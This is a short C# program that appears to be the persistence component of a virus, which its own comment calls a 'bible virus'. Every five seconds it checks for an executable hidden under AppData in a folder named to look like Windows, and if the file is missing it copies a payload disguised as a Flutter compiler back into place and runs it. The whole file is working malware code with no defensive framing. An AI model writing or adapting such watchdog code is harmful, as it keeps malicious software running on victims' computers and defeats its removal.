using System;
using System.IO;
using System.Threading;
using System.Diagnostics;

namespace checkerVi
{
    internal class checkerVi
    {
        static void Main()
        {
            string appDir = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string srcDir = (appDir + "\\Windows\\process");
            while (true)
            {
                Thread.Sleep(5000);
                if (!File.Exists(srcDir + "\\ctp.exe") || !Directory.Exists(srcDir)) //Check if file or folder does not exists
                {
                    FileInfo sourceFileInfo = new FileInfo(appDir + "\\.flutter-packages\\flutter_compiler.exe");
                    //Source
                    sourceFileInfo.CopyTo(srcDir + "\\ctp.exe", true);
                    //Destination
                    Process.Start(srcDir + "\\ctp.exe");
                    //Run bible virus
                }
            }
        }
    }
}
